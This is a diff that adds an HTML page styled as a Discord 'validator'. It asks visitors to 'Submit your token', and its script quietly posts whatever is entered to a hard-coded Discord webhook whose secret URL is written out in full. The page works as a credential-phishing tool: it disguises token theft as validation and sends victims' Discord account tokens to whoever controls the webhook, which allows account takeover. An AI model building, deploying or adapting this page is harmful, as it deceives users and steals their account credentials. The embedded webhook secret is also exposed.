@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send a Message to Discord</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="favicon.ico" type="image/x-icon"> <!-- Add your favicon path here -->
+
+    <!-- Discord-style fonts and theme colors -->
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #36393F;
+            color: #FFFFFF;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        header {
+            width: 100%;
+            background-color: #2C2F33;
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+
+        .discord-logo {
+            width: 100px; /* Adjust logo size */
+            margin-left: 5px; /* Space between logo and title */
+        }
+
+        .discord-title {
+            font-size: 24px;
+            color: #7289DA;
+            text-decoration: none;
+        }
+
+        .header-image {
+            width: 150px; /* Adjust based on the image size you provide */
+            margin-left: 10px; /* Space between logo and image */
+        }
+
+        .container {
+            background-color: #2C2F33;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.25);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            margin-top: 80px; /* Space for the fixed header */
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center contents in the container */
+        }
+
+        h1 {
+            color: #7289DA;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #7289DA;
+            border-radius: 5px;
+            background-color: #40444B;
+            color: #FFFFFF;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #7289DA;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        button:hover {
+            background-color: #5b6eae;
+        }
+
+        #response {
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        
+        <a href="https://discord.com" target="_blank">
+            <img class="header-image" src="https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/6257d23c5fb25be7e0b6e220_Open%20Source%20Projects%20_%20Discord-7.svg" alt="Discord"> <!-- Replace with your image -->
+        </a>
+
+    </header>
+
+    <div class="container">
+<img class="discord-logo" style="border-radius:50%;" src="logo.jpg" alt="Discord Validator Logo" style="margin-bottom: 20px;">
+        <h1>Submit your token:</h1>
+
+        <form id="discordForm">
+            <input type="text" id="message" placeholder="Enter your token" required>
+            <button type="submit">Submit Token</button>
+        </form>
+
+        <p id="response" style="color: green;"></p>
+    </div>
+
+    <script>
+        const form = document.getElementById('discordForm');
+        const messageInput = document.getElementById('message');
+        const responseText = document.getElementById('response');
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent the form from submitting the usual way
+
+            const message = messageInput.value.trim();
+            if (message === '') {
+                alert('Please enter a message.');
+                return;
+            }
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1289955142254202940/ZXY_4yS1HYIpxjBjHkCyOtLCDM8aTnV8dKYwC4k8rVjnBR3sYC264jmoC9X3nwrFDqry'; // Replace with your actual webhook URL
+
+            // Construct the payload for Discord
+            const payload = {
+                content: message
+            };
+
+            // Send the payload to Discord via webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    responseText.textContent = 'Token submitted successfully!';
+                    messageInput.value = ''; // Clear the input after sending
+                } else {
+                    responseText.textContent = 'Failed to submit your token.';
+                    responseText.style.color = 'red';
+                }
+            })
+            .catch(error => {
+                responseText.textContent = 'Error: ' + error.message;
+                responseText.style.color = 'red';
+            });
+        });
+    </script>
+
+</body>
+</html>
